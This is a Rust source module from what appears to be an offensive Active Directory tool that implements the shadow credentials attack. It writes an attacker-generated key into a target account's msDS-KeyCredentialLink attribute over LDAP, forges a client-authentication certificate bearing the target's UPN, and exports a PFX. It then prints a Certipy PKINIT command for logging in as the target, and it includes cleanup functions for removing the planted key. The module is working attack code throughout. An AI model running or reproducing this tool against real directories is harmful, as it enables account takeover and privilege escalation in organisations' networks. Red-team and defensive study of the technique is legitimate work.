pub mod builder;
pub mod parser;
pub mod structures;

use crate::commands::ldap_utils::{handle_modify_error, resolve_object_dn};
use crate::help::add_terminal_spacing;
use ldap3::{LdapConn, Mod, Scope, SearchEntry};
use rsa::traits::PublicKeyParts;
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use uuid::Uuid;

const ATTR_NAME: &str = "msDS-KeyCredentialLink";

pub fn list_shadow_credentials(
    ldap: &mut LdapConn,
    search_base: &str,
    target: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    add_terminal_spacing(1);

    let target_dn = resolve_object_dn(ldap, search_base, target)?;
    println!("[*] Target DN: {}", target_dn);

    let (results, _) = ldap
        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
        .success()
        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;

    if results.is_empty() {
        println!("[!] Target object not found");
        add_terminal_spacing(1);
        return Ok(());
    }

    let entry = SearchEntry::construct(results[0].clone());

    // DN-Binary values are valid UTF-8 strings,
    // so ldap3 puts them in attrs (not bin_attrs)
    let values = match entry.attrs.get(ATTR_NAME) {
        Some(v) if !v.is_empty() => v,
        _ => {
            println!(
                "[*] No Key Credentials found \
                 on {}",
                target
            );
            add_terminal_spacing(1);
            return Ok(());
        }
    };

    println!("[+] Found {} Key Credential(s):\n", values.len());

    for (i, dn_binary_str) in values.iter().enumerate() {
        let blob = match parser::extract_blob_from_dn_binary(dn_binary_str.as_bytes()) {
            Ok(b) => b,
            Err(e) => {
                eprintln!(
                    "  [!] Failed to decode \
                     DN-Binary {}: {}",
                    i + 1,
                    e
                );
                continue;
            }
        };

        match parser::parse_key_credential(&blob) {
            Ok(cred) => {
                println!("  --- Credential {} ---", i + 1);
                if let Some(ref id) = cred.device_id {
                    println!("  DeviceId:     {}", id);
                }
                if let Some(ref t) = cred.creation_time {
                    println!("  Created:      {}", t);
                }
                println!("  KeyUsage:     {}", cred.key_usage_str());
                println!("  KeySource:    {}", cred.key_source_str());
                if let Some(ref kid) = cred.key_id {
                    println!("  KeyID:        {}", hex::encode(kid));
                }
                if let Some(ref t) = cred.last_logon_time {
                    println!("  LastLogon:    {}", t);
                }
                println!();
            }
            Err(e) => {
                eprintln!(
                    "  [!] Failed to parse \
                     credential {}: {}",
                    i + 1,
                    e
                );
            }
        }
    }

    add_terminal_spacing(1);
    Ok(())
}

pub fn add_shadow_credential(
    ldap: &mut LdapConn,
    search_base: &str,
    target: &str,
    domain: &str,
    output_pfx: &str,
    pfx_password: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    add_terminal_spacing(1);

    let target_dn = resolve_object_dn(ldap, search_base, target)?;
    println!("[*] Target DN: {}", target_dn);

    println!("[*] Generating RSA 2048 key pair...");

    let private_key =
        rsa::RsaPrivateKey::new(&mut rand::thread_rng(), 2048)?;
    let public_key = private_key.to_public_key();

    let modulus_bytes = public_key.n().to_bytes_be();
    let exponent_bytes = public_key.e().to_bytes_be();
    let key_bit_len = public_key.n().bits() as u32;

    let bcrypt_pubkey =
        builder::encode_bcrypt_rsa_public_key(
            &modulus_bytes,
            &exponent_bytes,
            key_bit_len,
        );

    let pkcs8_der =
        rsa::pkcs8::EncodePrivateKey::to_pkcs8_der(
            &private_key,
        )?;
    let key_pair =
        rcgen::KeyPair::from_der(pkcs8_der.as_bytes())?;

    let device_id = Uuid::new_v4();
    println!("[*] DeviceId: {}", device_id);

    let upn = format!("{}@{}", target, domain);
    let mut params = rcgen::CertificateParams::default();
    params.distinguished_name =
        rcgen::DistinguishedName::new();
    params
        .distinguished_name
        .push(rcgen::DnType::CommonName, target);
    params.not_before = rcgen::date_time_ymd(2024, 1, 1);
    params.not_after = rcgen::date_time_ymd(2034, 1, 1);
    params.alg = &rcgen::PKCS_RSA_SHA256;
    params.key_pair = Some(key_pair);
    params.key_usages = vec![
        rcgen::KeyUsagePurpose::DigitalSignature,
        rcgen::KeyUsagePurpose::KeyEncipherment,
    ];
    params.extended_key_usages =
        vec![rcgen::ExtendedKeyUsagePurpose::ClientAuth];
    params.custom_extensions =
        vec![build_san_upn_extension(&upn)];

    let cert = rcgen::Certificate::from_params(params)?;

    let cert_der = cert.serialize_der()?;
    let key_der = cert.serialize_private_key_der();

    let key_id_hash = Sha256::digest(&bcrypt_pubkey);
    println!(
        "[*] KeyID (SHA256 of BCRYPT blob): {}",
        hex::encode(key_id_hash)
    );

    let blob = builder::build_key_credential_blob(
        &bcrypt_pubkey,
        &device_id,
    );

    // Encode as DN-Binary string
    let dn_binary_value = builder::encode_dn_binary(&blob, &target_dn);

    let (results, _) = ldap
        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
        .success()
        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;

    if results.is_empty() {
        return Err("Target object not found".into());
    }

    let entry = SearchEntry::construct(results[0].clone());

    // Collect existing DN-Binary string values
    let mut existing: Vec<String> = entry.attrs.get(ATTR_NAME).cloned().unwrap_or_default();

    existing.push(dn_binary_value);

    let attr_bytes = ATTR_NAME.as_bytes().to_vec();
    let mut value_set = HashSet::new();
    for v in &existing {
        value_set.insert(v.as_bytes().to_vec());
    }

    match ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes, value_set)]) {
        Ok(result) => match result.success() {
            Ok(_) => {
                println!(
                    "[+] Shadow credential added \
                     to {}",
                    target
                );
            }
            Err(e) => {
                eprintln!(
                    "[!] Failed to write \
                     Key Credential: {}",
                    e
                );
                handle_modify_error(&e);
                eprintln!(
                    "[!] Need WriteProperty on \
                     msDS-KeyCredentialLink"
                );
                add_terminal_spacing(1);
                return Err(e.into());
            }
        },
        Err(e) => {
            eprintln!("[!] LDAP modify failed: {}", e);
            add_terminal_spacing(1);
            return Err(e.into());
        }
    }

    verify_credential(ldap, &target_dn, &hex::encode(key_id_hash));

    println!("[*] Exporting PFX to {}...", output_pfx);

    let pfx_bytes = build_pfx(&key_der, &cert_der, pfx_password, target)?;
    std::fs::write(output_pfx, &pfx_bytes)?;

    println!("[+] PFX certificate saved to {}", output_pfx);
    println!("[*] PFX password: {}", pfx_password);
    println!();
    println!("[*] Use with Certipy for PKINIT:");
    println!(
        "    certipy auth -pfx {} \
         -password {} -domain {} \
         -dc-ip <dc_ip>",
        output_pfx, pfx_password, domain
    );
    println!();
    println!(
        "[!] If you receive \
         KDC_ERR_PADATA_TYPE_NOSUPP, \
         the DC does not support PKINIT."
    );
    println!(
        "    Try targeting a different DC \
         with -dc-ip, or verify that AD CS \
         is deployed and DCs have"
    );
    println!(
        "    certificates with the \
         KDC Authentication EKU. \
         Consider RBCD as an alternative \
         attack path."
    );

    add_terminal_spacing(1);
    Ok(())
}

pub fn remove_shadow_credential(
    ldap: &mut LdapConn,
    search_base: &str,
    target: &str,
    device_id_str: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    add_terminal_spacing(1);

    let target_device_id =
        Uuid::parse_str(device_id_str).map_err(|e| format!("Invalid DeviceId UUID: {}", e))?;

    let target_dn = resolve_object_dn(ldap, search_base, target)?;
    println!("[*] Target DN: {}", target_dn);

    let (results, _) = ldap
        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
        .success()
        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;

    if results.is_empty() {
        return Err("Target object not found".into());
    }

    let entry = SearchEntry::construct(results[0].clone());
    let values = match entry.attrs.get(ATTR_NAME) {
        Some(v) if !v.is_empty() => v.clone(),
        _ => {
            println!(
                "[!] No Key Credentials found \
                 on {}",
                target
            );
            add_terminal_spacing(1);
            return Ok(());
        }
    };

    let mut remaining = Vec::new();
    let mut removed = false;

    for dn_binary_str in &values {
        let blob = match parser::extract_blob_from_dn_binary(dn_binary_str.as_bytes()) {
            Ok(b) => b,
            Err(_) => {
                remaining.push(dn_binary_str.clone());
                continue;
            }
        };

        match parser::parse_key_credential(&blob) {
            Ok(cred) => {
                if cred.device_id == Some(target_device_id) && !removed {
                    println!(
                        "[*] Found matching \
                         credential, removing"
                    );
                    removed = true;
                    continue;
                }
                remaining.push(dn_binary_str.clone());
            }
            Err(_) => {
                remaining.push(dn_binary_str.clone());
            }
        }
    }

    if !removed {
        println!(
            "[!] No credential with DeviceId \
             {} found",
            device_id_str
        );
        add_terminal_spacing(1);
        return Ok(());
    }

    let attr_bytes = ATTR_NAME.as_bytes().to_vec();

    if remaining.is_empty() {
        let empty_set: HashSet<Vec<u8>> = HashSet::new();
        match ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes, empty_set)]) {
            Ok(result) => match result.success() {
                Ok(_) => {
                    println!(
                        "[+] Removed last \
                         credential, attribute \
                         cleared on {}",
                        target
                    );
                }
                Err(e) => {
                    eprintln!(
                        "[!] Failed to clear \
                         attribute: {}",
                        e
                    );
                    add_terminal_spacing(1);
                    return Err(e.into());
                }
            },
            Err(e) => {
                eprintln!("[!] LDAP modify failed: {}", e);
                add_terminal_spacing(1);
                return Err(e.into());
            }
        }
    } else {
        let mut value_set = HashSet::new();
        for v in &remaining {
            value_set.insert(v.as_bytes().to_vec());
        }
        match ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes, value_set)]) {
            Ok(result) => match result.success() {
                Ok(_) => {
                    println!(
                        "[+] Removed credential \
                         {} from {}",
                        device_id_str, target
                    );
                }
                Err(e) => {
                    eprintln!(
                        "[!] Failed to update \
                         attribute: {}",
                        e
                    );
                    add_terminal_spacing(1);
                    return Err(e.into());
                }
            },
            Err(e) => {
                eprintln!("[!] LDAP modify failed: {}", e);
                add_terminal_spacing(1);
                return Err(e.into());
            }
        }
    }

    add_terminal_spacing(1);
    Ok(())
}

pub fn clear_shadow_credentials(
    ldap: &mut LdapConn,
    search_base: &str,
    target: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    add_terminal_spacing(1);

    let target_dn = resolve_object_dn(ldap, search_base, target)?;
    println!("[*] Target DN: {}", target_dn);

    let attr_bytes = ATTR_NAME.as_bytes().to_vec();
    let empty_set: HashSet<Vec<u8>> = HashSet::new();

    match ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes, empty_set)]) {
        Ok(result) => match result.success() {
            Ok(_) => {
                println!(
                    "[+] Cleared all Key \
                     Credentials on {}",
                    target
                );
                add_terminal_spacing(1);
                Ok(())
            }
            Err(e) => {
                eprintln!(
                    "[!] Failed to clear \
                     Key Credentials: {}",
                    e
                );
                handle_modify_error(&e);
                add_terminal_spacing(1);
                Err(e.into())
            }
        },
        Err(e) => {
            eprintln!("[!] LDAP modify failed: {}", e);
            add_terminal_spacing(1);
            Err(e.into())
        }
    }
}

fn build_pfx(
    private_key_der: &[u8],
    cert_der: &[u8],
    password: &str,
    alias: &str,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    use p12_keystore::{
        Certificate, EncryptionAlgorithm, KeyStore, KeyStoreEntry, LocalKeyId, MacAlgorithm,
        PrivateKey, PrivateKeyChain,
    };

    let private_key = PrivateKey::from_der(private_key_der)?;
    let certificate = Certificate::from_der(cert_der)?;

    let key_id = LocalKeyId::from(vec![1u8]);
    let chain = PrivateKeyChain::new(key_id, private_key, vec![certificate]);

    let mut keystore = KeyStore::new();
    keystore.add_entry(alias, KeyStoreEntry::PrivateKeyChain(chain));

    let pfx_bytes = keystore
        .writer(password)
        .encryption_algorithm(EncryptionAlgorithm::PbeWithShaAnd3KeyTripleDesCbc)
        .mac_algorithm(MacAlgorithm::HmacSha1)
        .write()?;

    Ok(pfx_bytes)
}

fn verify_credential(ldap: &mut LdapConn, target_dn: &str, expected_key_id: &str) {
    println!("[*] Verifying credential in AD...");

    let search = ldap.search(target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME]);

    let (results, _) = match search {
        Ok(r) => match r.success() {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[!] Verify read failed: {}", e);
                return;
            }
        },
        Err(e) => {
            eprintln!("[!] Verify search failed: {}", e);
            return;
        }
    };

    if results.is_empty() {
        eprintln!("[!] Verify: target not found");
        return;
    }

    let entry = SearchEntry::construct(results[0].clone());

    let values = entry.attrs.get(ATTR_NAME);
    let bin_values = entry.bin_attrs.get(ATTR_NAME);

    let str_count = values.map_or(0, |v| v.len());
    let bin_count = bin_values.map_or(0, |v| v.len());
    println!(
        "[*] Verify: {} string value(s), {} binary value(s)",
        str_count, bin_count
    );

    let mut found_match = false;
    if let Some(vals) = values {
        for (i, v) in vals.iter().enumerate() {
            match parser::extract_blob_from_dn_binary(v.as_bytes()) {
                Ok(blob) => match parser::parse_key_credential(&blob) {
                    Ok(cred) => {
                        if let Some(ref kid) = cred.key_id {
                            let kid_hex = hex::encode(kid);
                            let matches = kid_hex == expected_key_id;
                            println!(
                                "[*] Verify cred {}: KeyID={} match={}",
                                i + 1,
                                &kid_hex[..16],
                                matches
                            );
                            if matches {
                                found_match = true;
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] Verify cred {}: parse error: {}", i + 1, e);
                    }
                },
                Err(e) => {
                    eprintln!("[!] Verify cred {}: DN-Binary error: {}", i + 1, e);
                }
            }
        }
    }

    if found_match {
        println!("[+] Verify: credential KeyID matches certificate");
    } else {
        eprintln!("[!] Verify: NO matching KeyID found in AD!");
    }
}

fn build_san_upn_extension(upn: &str) -> rcgen::CustomExtension {
    let upn_bytes = upn.as_bytes();
    let utf8_string = der_encode(0x0C, upn_bytes);
    let value_wrapper = der_encode(0xA0, &utf8_string);

    // UPN OID: 1.3.6.1.4.1.311.20.2.3
    let oid_tlv: &[u8] = &[
        0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
    ];

    let mut content = Vec::new();
    content.extend_from_slice(oid_tlv);
    content.extend_from_slice(&value_wrapper);

    // otherName [0] CONSTRUCTED
    let other_name = der_encode(0xA0, &content);
    let general_names = der_encode(0x30, &other_name);

    // SAN extension OID: 2.5.29.17
    rcgen::CustomExtension::from_oid_content(&[2, 5, 29, 17], general_names)
}

fn der_encode(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut result = vec![tag];
    let len = content.len();
    if len < 128 {
        result.push(len as u8);
    } else if len < 256 {
        result.push(0x81);
        result.push(len as u8);
    } else {
        result.push(0x82);
        result.push((len >> 8) as u8);
        result.push(len as u8);
    }
    result.extend_from_slice(content);
    result
}
